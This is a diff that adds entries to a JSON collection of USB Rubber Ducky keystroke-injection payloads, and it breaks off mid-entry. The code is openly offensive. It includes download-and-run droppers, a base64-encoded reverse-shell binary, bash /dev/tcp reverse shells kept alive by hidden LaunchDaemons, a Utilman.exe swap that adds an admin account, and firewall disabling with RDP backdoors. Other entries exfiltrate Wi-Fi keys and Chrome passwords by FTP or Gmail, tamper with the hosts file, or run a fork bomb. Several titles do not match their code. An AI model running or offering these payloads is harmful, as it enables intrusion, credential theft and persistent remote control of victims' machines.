+    "Description": "Saves old index file as index.bak, then writes a new one detailing the extensiveness of the hack that has been performed against them.",
+    "Code": "ENTER\nSTRING cscript download.vbs http://example.com/fun_windows_executable.exe\nENTER\nSTRING fun_windows_executable.exe\nENTER\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": "Log off (Windows)",
+    "Id": 48,
+    "Description": "NOTE: Originally this script had a DEFAULT_DELAY value of 200. Since this value did not fit into a Java byte (Java bytes are signed) it had no effect on the final script. It has been removed.",
+    "Code": "GUI r\nDELAY 200\nSTRING cmd\nENTER\nDELAY 600\nSTRING cd %USERPROFILE%\nENTER\nSTRING ftp -i SERVER\nENTER\nDELAY 800\nSTRING USERNAME\nENTER\nSTRING PASSWORD\nENTER\nSTRING GET WinSCP.com\nENTER\nDELAY 200\nSTRING GET WinSCP.exe\nENTER\nDELAY 3000\nSTRING quit\nENTER\nREM FTP user only needs write access.\nSTRING WinSCP.com /command &#34;option batch abort&#34; &#34;option confirm off&#34; &#34;open ftp://USERNAME2:PASSWORD2@SERVER2&#34; &#34;put *.*&#34; &#34;close&#34; &#34;exit&#34;\nENTER\nALT SPACE\nSTRING N\n"
+  },
+  {
+    "Title": "Youtube blaster (OSX)",
+    "Id": 49,
+    "Description": "This script will erase attached drives on your computer. Made in to demonstrate batch wiper malware. Features a registry key that will restart the script on reboot, aswell as a vb script that will allow the batch file to run silently on vista and Windows 7 machines.",
+    "Code": "GUI r\nDELAY 100\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass &#34;IEX (New-Object System.Net.WebClient).DownloadFile(&#39;http://example.com/bob.txt&#39;,\\&#34;$env:temp\\bob.exe\\&#34;); Start-Process \\&#34;$env:temp\\bob.exe\\&#34;&#34;\nENTER\n"
+  },
+  {
+    "Title": "Photo Booth (OSX)",
+    "Id": 50,
+    "Description": "Still needs some work to get it to start up silently on restart.",
+    "Code": "REM You can remove this Delay line in the beginning (I just rather having it just in case)\nDELAY 60000\nREM open the Run\nGUI r\nREM Change this value depending on the computer you are using ( i mean slow or not )\nDELAY 100\nSTRING powershell -windowstyle hidden\nENTER\nREM the shell usually takes a few  seconds to fully run so i put a delay just in case .\nDELAY 1000\nREM I just wanted to note that the file can be an EXE or JAR file doesn&#39;t really matter.\nREM in the destination if you put the fileName only, the file will be saved under C:\\Users\\LoggedInUser\nSTRING $source = &#34;File URL &#34;; $destination = &#34;Path\\FileName&#34;; Invoke-WebRequest $source -OutFile $destination;\nENTER\nDELAY 5000\nSTRING start-process FileName.EXE\nENTER\nDELAY 100\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 51,
+    "Description": "Minimizes all windows to desktop, takes screenshot, disables desktop icons, saves screenshot in %userprofile% and sets as wallpaper",
+    "Code": "REM You can remove this Delay line in the beginning (I just rather having it just in case)\nDELAY 60000\nREM open the Run\nGUI r\nREM Change this value depending on the computer you are using ( i mean slow or not )\nDELAY 100\nSTRING powershell -windowstyle hidden\nENTER\nREM the shell usually takes a few  seconds to fully run so i put a delay just in case .\nDELAY 1000\nREM I just wanted to note that the file can be an EXE or JAR file doesn&#39;t really matter.\nREM in the destination if you put the fileName only, the file will be saved under C:\\Users\\LoggedInUser\nSTRING $source = &#34;http://192.168.43.34/Service.jar&#34;; $destination = &#34;Service.jar&#34;; Invoke-WebRequest $source -OutFile $destination;\nENTER\nDELAY 5000\nSTRING start-process Service.jar\nENTER\nDELAY 100\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 52,
+    "Description": "Same thing but better?",
+    "Code": "REM Windows 10: Poweshell administrator download and execute file\nREM Author: Judge2020\nREM author website: Judge2020.com\nREM\nREM start of script\nREM\nREM let the HID enumerate\nDELAY 1000\nGUI r\nDELAY 200\nREM my best attempt at a elevated powershell instance\nSTRING powershell Start-Process powershell -Verb runAs\nENTER\nDELAY 1000\nALT y\nDELAY 200\nSTRING $down = New-Object System.Net.WebClient; $url = &#39;http://www.greyhathacker.net/tools/messbox.exe&#39;; $file = &#39;mess1.exe&#39;; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;\n"
+  },
+  {
+    "Title": null,
+    "Id": 53,
+    "Description": "Changes the users desktop background to a Rubber Duck saying “YOU GOT QUACKED!” with a Hak5 logo",
+    "Code": "REM Simple script that downloads any file and runs it.\nREM Requires duckencoder 2.6.3 which can be downloaded at http://goo.gl/QkTXNp\nREM Note: you must put in your own specific code to execute\nDELAY 1000\nCOMMAND SPACE\nDELAY 800\nSTRING Terminal\nDELAY 500\nENTER\nDELAY 500\nSTRING curl http://SERVER/path/to/file &gt; file\nENTER\nDELAY 1000\nSTRING INSERT COMMAND TO EXECUTE HERE\nENTER\nREM You can chage the above line to the command used to open your program.\nREM Examples: python somescript.py , ./somescript.sh\nREM Note: This script doesn&#39;t delete the downloaded file so it may leave evidence of physical access.  Delete it as quickly as possible after this runs.\nREM Or alternatively you could hide it somewhere in a hidden folder where it won&#39;t be easily found.\n"
+  },
+  {
+    "Title": null,
+    "Id": 54,
+    "Description": null,
+    "Code": "ESCAPE\nCONTROL ESCAPE\nDELAY 400\nSTRING cmd\nDELAY 400\nMENU\nDELAY 400\nSTRING a\nDELAY 600\nLEFTARROW\nENTER\nDELAY 400\nSTRING copy con c:\\decoder.vbs\nENTER\nSTRING Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0)\nSTRING :outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS =\nSTRING CreateObject(&#34;Scripting.FileSystemObject&#34;):\nENTER\nSTRING set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded =\nSTRING objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function\nSTRING decodeBase64(base64):\nENTER\nSTRING dim DM, EL:Set DM = CreateObject(&#34;Microsoft.XMLDOM&#34;):Set EL = DM.createElement(&#34;tmp&#34;):\nSTRING EL.DataType = &#34;bin.base64&#34;:EL.Text = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub\nSTRING writeBytes(file, bytes):Dim binaryStream:\nENTER\nSTRING Set binaryStream = CreateObject(&#34;ADODB.Stream&#34;):binaryStream.Type = 1:\nSTRING binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub\nENTER\nCTRL z\nENTER\nSTRING copy con c:\\reverse.txt\nENTER\nSTRING TVprZXJuZWwzMi5kbGwAAFBFAABMAQIAAAAAAAAAAAAAAAAA4AAPAQsBAAAAAgAAAAAAAAAA\nENTER\nSTRING AADfQgAAEAAAAAAQAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAFAAAAACAAAAAAAA\nENTER\nSTRING AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA20IAABQAAAAAAAAAAAAAAAAA\nENTER\nSTRING AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nENTER\nSTRING AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUVXAEYS\nENTER\nSTRING 0sMAMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAwALSdduKFuvUABAAAABAAADvAgAA\nENTER\nSTRING AAIAAAAAAAAAAAAAAAAAAOAAAMC+HEBAAIvera1QrZeygKS2gP8Tc/kzyf8TcxYzwP8TcyG2\nENTER\nSTRING gEGwEP8TEsBz+nU+quvg6HI+AAAC9oPZAXUO/1P86yas0eh0LxPJ6xqRSMHgCKz/U/w9AH0A\nENTER\nSTRING AHMKgPwFcwaD+H93AkFBlYvFtgBWi/cr8POkXuubrYXAdZCtlq2XVqw8AHX7/1PwlVatD8hA\nENTER\nSTRING WXTseQesPAB1+5FAUFX/U/SrdefDAAAAAAAzyUH/ExPJ/xNy+MOwQgAAvUIAAAAAAAAAQEAA\nENTER\nSTRING MAFAAAAQQAAAEEAAaBwGMkAHagHoDnw4VQzoQgLIFTiean446lMMelAsFnRBMP0Bv1WysTNq\nENTER\nSTRING kQIGsnxVmiejeINmxwVke0+mOGe8XVBmlD05ZqNofmRmfiF9i3MM2QpqaJQtoTp6b0gV6kwF\nENTER\nSTRING EVBkkBBNRFWRFDxAeGooEGhdKP81MHTopJ5RVFWhVY2/bg4KCJAiC+FRFOgfgUvD/yUkILtv\nENTER\nSTRING KhwGQxghFL3DIghxzAFVi+yBxHz+/4hWV+hgrN2JRfwzHcmLdX44PB10Bx4iQPdB6/RR0XLp\nENTER\nSTRING AOFYO8F0C19eMLgDucnCCOGGSY29PHDlQyoJzy/gArAgqutz8iiNhRU5i/A2+DMqM+sbiwNm\nENTER\nSTRING MgfvImUgTf4iEeEoLe2UCIO53LcwS3T7OzpNCKgVWWUdZwpME0EdDxTr5qoNNgcZhzj0sH/A\nENTER\nSTRING VXMRi30Mxhe4An+CohOdaLCgWDQzDUYN5tH34f5Yo+7nRLsfFqnOEQTeVQE81BTUDhszwE7s\nENTER\nSTRING hwtw0ooGRj08ArMSDvffkOsLLDAZjQyJBkiDLQrAdfHoBBEzUcI44jCDxAf0avXoaQkZSf+9\nENTER\nSTRING gqogC9Aqk3U3+FAinSmGBvzoTS9oiyQ45lMaDwiNUAMhGIPABOP5//6AAvfTI8uB4USAdHzp\nENTER\nSTRING bMEMYHV3BvQQwEAC0OEbwlFbOkfESRnKDFcGCDAAADBAAGMwbWQAZj9AABQ4IEADd3MyXzOY\nENTER\nSTRING LmRs48CAZwdldGhvc0BieW5he23PHmOePPfr/w4SV1NBXc9hckZ1cBh5aMoscxNPJmNrYu/B\nENTER\nSTRING /7gDbJUacspebEzHV9NpdPNGp7yRR8NMQ29tiGFuZDZMaURifoB2cvudOlC3gudzFUFYIcBk\nENTER\nSTRING SNBDL2AAAAAAAGY/QABMb2FkTGlicmFyeUEAR2V0UHJvY0FkZHJlc3MAAAAAAAAAAAAAAAAA\nENTER\nSTRING AAxAAADpdL7//wAAAAIAAAAMQAAA\nENTER\nCTRL z\nENTER\nSTRING cscript c:\\decoder.vbs c:\\reverse.txt c:\\reverse.exe\nENTER\nSTRING c:\\reverse.exe evilserver.example.com 8080\nENTER\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 55,
+    "Description": null,
+    "Code": "nc -l 8080\n"
+  },
+  {
+    "Title": null,
+    "Id": 56,
+    "Description": null,
+    "Code": "CONTROL ESCAPE\nDELAY 200\nSTRING cmd\nDELAY 200\nMENU\nDELAY 100\nSTRING a\nENTER\nDELAY 200\nLEFT\nENTER\nDELAY 1000\nSTRING cd %ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\nENTER\nSTRING copy con a.bat\nENTER\nSTRING @echo off\nENTER\nSTRING :START\nENTER\nSTRING start a.bat\nENTER\nSTRING GOTO START\nENTER\nCONTROL z\nENTER\nSTRING a.bat\nENTER\nALT F4\n"
+  },
+  {
+    "Title": null,
+    "Id": 57,
+    "Description": null,
+    "Code": "GUI\nDELAY 50\nSTRING cmd\nMENU\nSTRING a\nENTER\nLEFT\nENTER\nDELAY 200\nSTRING takeown /f &#34;%systemroot%\\System32\\Utilman.exe&#34;\nENTER\nDELAY 50\nSTRING icacls &#34;%systemroot%\\System32\\Utilman.exe&#34; /grant administrators:F /T\nENTER\nDELAY 50\nSTRING cd %systemroot%\\System32\nENTER\nDELAY 50\nSTRING mkdir util\nENTER\nSTRING xcopy cmd.exe util\\\nENTER\nDELAY 50\nSTRING ren Utilman.exe Utilman.exe.bak\nENTER\nSTRING cd util\nENTER\nDELAY 50\nSTRING ren cmd.exe Utilman.exe\nENTER\nDELAY 50\nSTRING cd ..\nENTER\nDELAY 50\nSTRING xcopy util/Utilman.exe \\\nENTER\nDELAY 50\nSTRING rmdir /s /q util\nENTER\nDELAY 50\nSTRING exit\nENTER\nDELAY 50\nGUI u\nSTRING net user Local000 /add\nENTER\nDELAY 50\nSTRING net localgroup administrators Local000 /add\nENTER\nDELAY 50\nSTRING exit\nENTER\nDELAY 50\nGUI r\nSTRING cmd\nENTER\nDELAY 50\nSTRING cd &#34;%systemroot%\\System32&#34;\nENTER\nDELAY 50\nSTRING delete Utilman.exe\nENTER\nDELAY 50\nSTRING y\nENTER\nDELAY 50\nSTRING ren Utilman.exe.bak Utilman.exe\nENTER\nDELAY 50\nSTRING exit\nENTER\nGUI\nSTRING cmd\nMENU\nSTRING a\nENTER\nDELAY 50\nLEFT\nENTER\nDELAY 200\nSTRING net user Local000 *\nENTER\nSTRING hak5\nENTER\nSTRING hak5\nENTER\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 58,
+    "Description": null,
+    "Code": "REM turn off windows defender then clear action center\nREM You take responsibility for any laws you break with this, I simply point out the security flaw\nREM\nREM start of script\nREM\nREM let the HID enumerate\nDELAY 2000\nESCAPE\nDELAY 100\nCONTROL ESCAPE\nDELAY 100\nSTRING Windows Defender Settings\nENTER\nDELAY 2000\nREM why TAB and HOME?\nTAB\nDELAY 50\nREM why TAB and HOME?HOME\nDELAY 50\nALT F4\nDELAY 3200\nREM windows + a = ????\nGUI a\nDELAY 500\nENTER\nDELAY 100\nGUI a\n"
+  },
+  {
+    "Title": null,
+    "Id": 59,
+    "Description": null,
+    "Code": "CONTROL ESCAPE\nDELAY 200\nSTRING cmd\nDELAY 200\nMENU\nDELAY 100\nSTRING a\nDELAY 100\nLEFTARROW\nENTER\nDELAY 200\nSTRING netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678\nENTER\nDELAY 100\nSTRING netsh wlan start hostednetwork\nENTER\nDELAY 100\nSTRING netsh firewall set opmode disable\nENTER\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 60,
+    "Description": null,
+    "Code": "DELAY 2000\nESCAPE\nCONTROL ESCAPE\nDELAY 400\nSTRING cmd\nDELAY 400\nCTRL-SHIFT ENTER\nDELAY 400\nSTRING netsh firewall set opmode mode=disable\nENTER\nDELAY 400\nSTRING netsh wlan export profile key=clear\nENTER\nDELAY 400\nSTRING cd %USERPROFILE%\nENTER\nDELAY 400\nSTRING ftp -i ftp server\nENTER\nDELAY 400\nSTRING username\nENTER\nDELAY 400\nSTRING password\nENTER\nDELAY 600\nSTRING prompt\nENTER\nDELAY 400\nSTRING prompt\nENTER\nDELAY 400\nSTRING MPUT *.xml\nENTER\nDELAY 4000\nSTRING bye\nENTER\nDELAY 400\nSTRING del *.xml\nENTER\nDELAY 200\nSTRING netsh firewall set opmode mode=enable\nENTER\nDELAY 400\nALT SPACE\nSTRING c\n"
+  },
+  {
+    "Title": null,
+    "Id": 61,
+    "Description": null,
+    "Code": "DEFAULT_DELAY 200\nESC\nESC\nREM opens task manager for a distraction\nREM tell user you are checking memory or somthing\nGUI r\nSTRING taskmgr\nENTER\nALT SPACE\nSTRING X\nTAB\nTAB\nTAB\nTAB\nLEFT\nLEFT\nREM opens network manager\nCTRL ESC\nSTRING Manage Wireless Networks\nENTER\nTAB\nTAB\nTAB\nTAB\nENTER\nENTER\nREM creates ap association\nSTRING I_Love_Pineapples\nTAB\nDOWN\nTAB\nSPACE\nTAB\nSPACE\nENTER\nESC\nALT F4\nCTRL ESC\nREM reboots for autoconnect to pineapple\nGUI r\nSTRING Shutdown.exe -r -t 00\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 62,
+    "Description": null,
+    "Code": "DELAY 2000\nESCAPE\nCONTROL ESCAPE\nDELAY 400\nSTRING cmd\nDELAY 400\nCTRL-SHIFT ENTER\nDELAY 400\nSTRING cd C:\\Windows\\System32\\drivers\\etc\\\nENTER\nDELAY 400\nSTRING echo 64.149.122.94 www.test.com&gt;&gt;hosts\nENTER\nDELAY 400\nALT SPACE\nSTRING c\n"
+  },
+  {
+    "Title": null,
+    "Id": 63,
+    "Description": null,
+    "Code": "GUI r\nSTRING cmd /Q /D /T:7F /F:OFF /V:ON /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\nDELAY 50\nSTRING ECHO. &gt;&gt; C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS\nDELAY 50\nENTER\nDELAY 50\nSTRING ECHO 10.0.0.1 ADMIN.COM &gt;&gt; C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS\nDELAY 50\nENTER\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 64,
+    "Description": null,
+    "Code": "REM A script to create a local DNS entry in the host file of a mac.\nREM change the example.com to any site you want.\nREM change the 127.0.0.1 to any ip you want.\nDELAY 1000\nSTRING mount -uw /\nENTER\nDELAY 2000\nENTER\nSTRING nano /private/etc/hosts\nENTER\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nDOWNARROW\nSTRING 127.0.0.1 example.com\nENTER\nSTRING 127.0.0.1 www.example.com\nENTER\nCTRL o\nENTER\nCTRL x\nSTRING shutdown -h now\n"
+  },
+  {
+    "Title": null,
+    "Id": 65,
+    "Description": null,
+    "Code": "REM ---[Start CMD as administrator]-----------------------\nGUI\nDELAY 50\nSTRING cmd\nDELAY 150\nMENU\nDELAY 75\nSTRING a\nENTER\nDELAY 200\nLEFT\nENTER\nSTRING cls\nENTER\nREM ---[END]----------------------------------------------\nDELAY 300\nREM ---[Inject into the host file]------------------------\nSTRING copy con inject.bat\nENTER\nSTRING SET NEWLINE=^&amp; echo.\nENTER\nENTER\nSTRING FIND /C /I &#34;[WEBSITE_ADDRESS]&#34; %WINDIR%\\system32\\drivers\\etc\\hosts\nENTER\nSTRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]&gt;&gt;%WINDIR%\\system32\\drivers\\etc\\hosts\nENTER\nENTER\nSTRING FIND /C /I &#34;[WEBSITE_ADDRESS]&#34; %WINDIR%\\system32\\drivers\\etc\\hosts\nENTER\nSTRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]&gt;&gt;%WINDIR%\\system32\\drivers\\etc\\hosts\nENTER\nCONTROL z\nENTER\nSTRING inject.bat\nENTER\nREM ---[END]----------------------------------------------\nDELAY 200\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 66,
+    "Description": null,
+    "Code": "DELAY 2000\nESCAPE\nCONTROL ESCAPE\nDELAY 400\nSTRING cmd\nDELAY 400\nCTRL-SHIFT ENTER\nDELAY 400\nSTRING netsh firewall set opmode mode=disable\nENTER\nDELAY 400\nSTRING ALT y\nENTER\nDELAY 400\nSTRING net user /add username password\nENTER\nDELAY 400\nSTRING net localgroup administrators username /add\nENTER\nDELAY 400\nSTRING reg add &#34;hklm\\system\\currentControlSet\\Control\\Terminal Server&#34; /v &#34;AllowTSConnections&#34; /t\nREG_DWORD /d 0x1 /f\nENTER\nDELAY 400\nSTRING reg add &#34;hklm\\system\\currentControlSet\\Control\\Terminal Server&#34; /v &#34;fDenyTSConnections&#34; /t\nREG_DWORD /d 0x0 /f\nENTER\nDELAY 400\nSTRING sc config TermService start= auto\nENTER\nDELAY 400\nSTRING net start Termservice\nENTER\nDELAY 400\nSTRING cd %USERPROFILE%\nENTER\nDELAY 400\nSTRING ipconfig /all &gt; number.txt\nENTER\nDELAY 400\nSTRING ftp -i ftp server\nENTER\nDELAY 400\nSTRING login name\nENTER\nDELAY 400\nSTRING login password\nENTER\nDELAY 600\nSTRING prompt\nENTER\nDELAY 400\nSTRING prompt\nENTER\nDELAY 400\nSTRING PUT number.txt\nENTER\nDELAY 2000\nSTRING bye\nENTER\nDELAY 400\nSTRING del number.txt\nENTER\nDELAY 400\nALT SPACE\nSTRING c\n"
+  },
+  {
+    "Title": null,
+    "Id": 67,
+    "Description": null,
+    "Code": "REM A simple script for rooting OSX from single user mode.\nREM Change mysite.com to your domain name or IP address\nREM Change 1337 to your port number\nREM Catch the shell with &#39;nc -l -p 1337&#39;\nREM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/\nDELAY 1000\nSTRING mount -uw /\nENTER\nDELAY 2000\nSTRING mkdir /Library/.hidden\nENTER\nDELAY 200\nSTRING echo &#39;#!/bin/bash\nENTER\nSTRING bash -i &gt;&amp; /dev/tcp/mysite.com/1337 0&gt;&amp;1\nENTER\nSTRING wait&#39; &gt; /Library/.hidden/connect.sh\nENTER\nDELAY 500\nSTRING chmod +x /Library/.hidden/connect.sh\nENTER\nDELAY 200\nSTRING mkdir /Library/LaunchDaemons\nENTER\nDELAY 200\nSTRING echo &#39;&lt;plist version=&#34;1.0&#34;&gt;\nENTER\nSTRING &lt;dict&gt;\nENTER\nSTRING &lt;key&gt;Label&lt;/key&gt;\nENTER\nSTRING &lt;string&gt;com.apples.services&lt;/string&gt;\nENTER\nSTRING &lt;key&gt;ProgramArguments&lt;/key&gt;\nENTER\nSTRING &lt;array&gt;\nENTER\nSTRING &lt;string&gt;/bin/sh&lt;/string&gt;\nENTER\nSTRING &lt;string&gt;/Library/.hidden/connect.sh&lt;/string&gt;\nENTER\nSTRING &lt;/array&gt;\nENTER\nSTRING &lt;key&gt;RunAtLoad&lt;/key&gt;\nENTER\nSTRING &lt;true/&gt;\nENTER\nSTRING &lt;key&gt;StartInterval&lt;/key&gt;\nENTER\nSTRING &lt;integer&gt;60&lt;/integer&gt;\nENTER\nSTRING &lt;key&gt;AbandonProcessGroup&lt;/key&gt;\nENTER\nSTRING &lt;true/&gt;\nENTER\nSTRING &lt;/dict&gt;\nENTER\nSTRING &lt;/plist&gt;&#39; &gt; /Library/LaunchDaemons/com.apples.services.plist\nENTER\nDELAY 500\nSTRING chmod 600 /Library/LaunchDaemons/com.apples.services.plist\nENTER\nDELAY 200\nSTRING launchctl load /Library/LaunchDaemons/com.apples.services.plist\nENTER\nDELAY 1000\nSTRING shutdown -h now\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 68,
+    "Description": null,
+    "Code": "nc -l -p 1337\n"
+  },
+  {
+    "Title": null,
+    "Id": 69,
+    "Description": null,
+    "Code": "REM A simple script for creating a persistent backdoor on OSX.\nREM Change mysite.com to your domain name or IP address\nREM Change 1337 to your port number\nREM Catch the shell with &#39;nc -l -p 1337&#39;\nREM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/\nDELAY 1000\nGUI SPACE\nSTRING terminal\nDELAY 500\nENTER\nDELAY 500\nSTRING mkdir ~/Library/.hidden\nENTER\nDELAY 200\nSTRING echo &#39;#!/bin/bash\nENTER\nSTRING bash -i &gt;&amp; /dev/tcp/mysite.com/1337 0&gt;&amp;1\nENTER\nSTRING wait&#39; &gt; ~/Library/.hidden/connect.sh\nENTER\nDELAY 500\nSTRING chmod +x ~/Library/.hidden/connect.sh\nENTER\nDELAY 200\nSTRING mkdir ~/Library/LaunchAgents\nENTER\nDELAY 200\nSTRING echo &#39;&lt;plist version=&#34;1.0&#34;&gt;\nENTER\nSTRING &lt;dict&gt;\nENTER\nSTRING &lt;key&gt;Label&lt;/key&gt;\nENTER\nSTRING &lt;string&gt;com.apples.services&lt;/string&gt;\nENTER\nSTRING &lt;key&gt;ProgramArguments&lt;/key&gt;\nENTER\nSTRING &lt;array&gt;\nENTER\nSTRING &lt;string&gt;/bin/sh&lt;/string&gt;\nENTER\nSTRING &lt;string&gt;&#39;$HOME&#39;/Library/.hidden/connect.sh&lt;/string&gt;\nENTER\nSTRING &lt;/array&gt;\nENTER\nSTRING &lt;key&gt;RunAtLoad&lt;/key&gt;\nENTER\nSTRING &lt;true/&gt;\nENTER\nSTRING &lt;key&gt;StartInterval&lt;/key&gt;\nENTER\nSTRING &lt;integer&gt;60&lt;/integer&gt;\nENTER\nSTRING &lt;key&gt;AbandonProcessGroup&lt;/key&gt;\nENTER\nSTRING &lt;true/&gt;\nENTER\nSTRING &lt;/dict&gt;\nENTER\nSTRING &lt;/plist&gt;&#39; &gt; ~/Library/LaunchAgents/com.apples.services.plist\nENTER\nDELAY 200\nSTRING chmod 600 ~/Library/LaunchAgents/com.apples.services.plist\nENTER\nDELAY 200\nSTRING launchctl load ~/Library/LaunchAgents/com.apples.services.plist\nENTER\nDELAY 200\nGUI q\n"
+  },
+  {
+    "Title": null,
+    "Id": 70,
+    "Description": null,
+    "Code": "nc -l -p 1337\n"
+  },
+  {
+    "Title": null,
+    "Id": 71,
+    "Description": null,
+    "Code": "REM This script adds a ssh public key to the authorized_keys file on a target&#39;s mac.\nDELAY 1000\nCOMMAND SPACE\nDELAY 500\nSTRING Terminal\nDELAY 500\nENTER\nDELAY 800\nSTRING echo &#39;RSA_PUB_ID&#39; &gt;&gt; ~/.ssh/authorized_keys\nENTER\nDELAY 1000\nSTRING killall Terminal\nENTER\nREM Note: you may shorten the times if you think they are too slow.  I made them to accomodate older macs that can&#39;t get around very fast.\n"
+  },
+  {
+    "Title": null,
+    "Id": 72,
+    "Description": null,
+    "Code": "REM Target: Windows 7\nREM Description: Opens chrome, navigates to chrome settings, navigates to saved passwords, searches for facebook, shows password, copys password\nREM closes chrome, Opens notepad with bypass uac so it can save to C:\\ drive and pastes in password\nREM saves to C:\\passwords.txt folder, closes notepad\nREM sends files via gmail to account.\nDELAY 2000\nREM -------------open chrome\nGUI r\nDELAY 1000\nSTRING chrome\nDELAY 1000\nENTER\nDELAY 4000\nREM -------------copy plaintext password\nSTRING chrome://settings/passwords\nENTER\nDELAY 2000\nSTRING facebook\nDELAY 500\nTAB\nDELAY 500\nDOWN\nDELAY 500\nTAB\nDELAY 500\nTAB\nDELAY 500\nENTER\nDELAY 500\nALT D\nDELAY 500\nTAB\nDELAY 500\nTAB\nDELAY 500\nTAB\nDELAY 500\nCTRL C\nDELAY 500\nALT F4\nDELAY 500\nREM -------------save file to music folder as passwords.txt\nGUI R\nDELAY 500\nSTRING powershell start-process notepad.exe -Verb runAs\nDELAY 500\nENTER\nDELAY 2000\nALT y\nDELAY 1000\nCTRL V\nDELAY 500\nALT f\nDELAY 500\nSTRING s\nDELAY 500\nSTRING passwords.txt\nDELAY 500\nTAB\nTAB\nTAB\nTAB\nTAB\nTAB\nTAB\nTAB\nTAB\nSTRING c\nDELAY 1000\nSTRING l\nDELAY 500\nENTER\nDELAY 500\nALT S\nDELAY 1000\nALT F4\nDELAY 500\nREM -------------email log via gmail\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING $SMTPServer = &#39;smtp.gmail.com&#39;\nENTER\nSTRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\nENTER\nSTRING $SMTPInfo.EnableSsl = $true\nENTER\nSTRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential(&#39;youremail@gmail.com&#39;, &#39;password&#39;);\nENTER\nSTRING $ReportEmail = New-Object System.Net.Mail.MailMessage\nENTER\nSTRING $ReportEmail.From = &#39;youremail@gmail.com&#39;\nENTER\nSTRING $ReportEmail.To.Add(&#39;toemail@gmail.com&#39;)\nENTER\nSTRING $ReportEmail.Subject = &#39;Ducky chrome passwords&#39;\nENTER\nSTRING $ReportEmail.Body = &#39;Attached is your list of passwords.&#39;\nENTER\nSTRING $ReportEmail.Attachments.Add(&#39;c:\\passwords.txt&#39;)\nENTER\nSTRING $SMTPInfo.Send($ReportEmail)\nENTER\nDELAY 3000\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": null,
+    "Id": 73,
+    "Description": null,
+    "Code": "DELAY 3000\nREM --&gt; Minimize all windows\nWINDOWS d\nREM --&gt; Open cmd\nWINDOWS r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nREM --&gt; Getting SSID\nSTRING cd &#34;%USERPROFILE%\\Desktop&#34; &amp; for /f &#34;tokens=2 delims=: &#34; %A in (&#39;netsh wlan show interface ^| findstr &#34;SSID&#34; ^| findstr /v &#34;BSSID&#34;&#39;) do set A=%A\nENTER\nREM --&gt; Creating A.txt\nSTRING netsh wlan show profiles %A% key=clear | findstr /c:&#34;Network type&#34; /c:&#34;Authentication&#34; /c:&#34;Key Content&#34; | findstr /v &#34;broadcast&#34; | findstr /v &#34;Radio&#34;&gt;&gt;A.txt\nENTER\nREM --&gt; Get network type\nSTRING for /f &#34;tokens=3 delims=: &#34; %A in (&#39;findstr &#34;Network type&#34; A.txt&#39;) do set B=%A\nENTER\nREM --&gt; Get authentication\nSTRING for /f &#34;tokens=2 delims=: &#34; %A in (&#39;findstr &#34;Authentication&#34; A.txt&#39;) do set C=%A\nENTER\nREM --&gt; Get password\nSTRING for /f &#34;tokens=3 delims=: &#34; %A in (&#39;findstr &#34;Key Content&#34; A.txt&#39;) do set D=%A\nENTER\nREM --&gt; Delete A.txt\nSTRING del A.txt\nENTER\nREM --&gt; Create Log.txt\nSTRING echo SSID: %A%&gt;&gt;Log.txt &amp; echo Network type: %B%&gt;&gt;Log.txt &amp; echo Authentication: %C%&gt;&gt;Log.txt &amp; echo Password: %D%&gt;&gt;Log.txt\nENTER\nREM --&gt; Mail Log.txt\nSTRING powershell\nENTER\nSTRING $SMTPServer = 